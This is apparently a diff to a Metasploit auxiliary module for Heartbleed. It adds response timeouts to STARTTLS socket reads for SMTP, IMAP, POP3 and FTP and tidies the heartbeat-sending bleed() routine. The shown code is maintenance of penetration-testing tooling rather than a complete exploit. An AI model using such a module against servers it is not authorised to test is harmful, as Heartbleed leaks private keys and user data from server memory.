@@ -194,39 +194,39 @@ class Metasploit3 < Msf::Auxiliary
 
   def tls_smtp
     # https://tools.ietf.org/html/rfc3207
-    sock.get_once
+    sock.get_once(-1, response_timeout)
     sock.put("EHLO #{Rex::Text.rand_text_alpha(10)}\r\n")
-    res = sock.get_once
+    res = sock.get_once(-1, response_timeout)
 
     unless res && res =~ /STARTTLS/
       return nil
     end
     sock.put("STARTTLS\r\n")
-    sock.get_once
+    sock.get_once(-1, response_timeout)
   end
 
   def tls_imap
     # http://tools.ietf.org/html/rfc2595
-    sock.get_once
+    sock.get_once(-1, response_timeout)
     sock.put("a001 CAPABILITY\r\n")
-    res = sock.get_once
+    res = sock.get_once(-1, response_timeout)
     unless res && res =~ /STARTTLS/i
       return nil
     end
     sock.put("a002 STARTTLS\r\n")
-    sock.get_once
+    sock.get_once(-1, response_timeout)
   end
 
   def tls_pop3
     # http://tools.ietf.org/html/rfc2595
-    sock.get_once
+    sock.get_once(-1, response_timeout)
     sock.put("CAPA\r\n")
-    res = sock.get_once
+    res = sock.get_once(-1, response_timeout)
     if res.nil? || res =~ /^-/ || res !~ /STLS/
       return nil
     end
     sock.put("STLS\r\n")
-    res = sock.get_once
+    res = sock.get_once(-1, response_timeout)
     if res.nil? || res =~ /^-/
       return nil
     end
@@ -270,7 +270,7 @@ class Metasploit3 < Msf::Auxiliary
     res = sock.get(response_timeout)
     return nil if res.nil?
     sock.put("AUTH TLS\r\n")
-    res = sock.get_once
+    res = sock.get_once(-1, response_timeout)
     return nil if res.nil?
     if res !~ /^234/
       # res contains the error message
@@ -297,10 +297,12 @@ class Metasploit3 < Msf::Auxiliary
 
   def bleed()
     # This actually performs the heartbleed portion
-    return :timeout if (establish_connect) == :timeout
+    connect_result = establish_connect
+    return :timeout if (connect_result) == :timeout
+
     vprint_status("#{peer} - Sending Heartbeat...")
     sock.put(heartbeat(heartbeat_length))
-    hdr = sock.get_once(5)
+    hdr = sock.get_once(5, response_timeout)
     if hdr.blank?
       vprint_error("#{peer} - No Heartbeat response...")
       return
@@ -313,7 +315,7 @@ class Metasploit3 < Msf::Auxiliary
 
     # try to get the TLS error
     if type == ALERT_RECORD_TYPE
-      res = sock.get_once(len)
+      res = sock.get_once(len, response_timeout)
       alert_unp = res.unpack('CC')
       alert_level = alert_unp[0]
       alert_desc = alert_unp[1]
@@ -515,7 +517,8 @@ class Metasploit3 < Msf::Auxiliary
 
     server_hello = sock.get(response_timeout)
     unless server_hello
-      vprint_error("#{peer} - No Client Hello response after #{response_timeout} seconds...")
+      vprint_error("#{peer} - No Server Hello after #{response_timeout} seconds...")
+      disconnect
       return :timeout
     end    
 
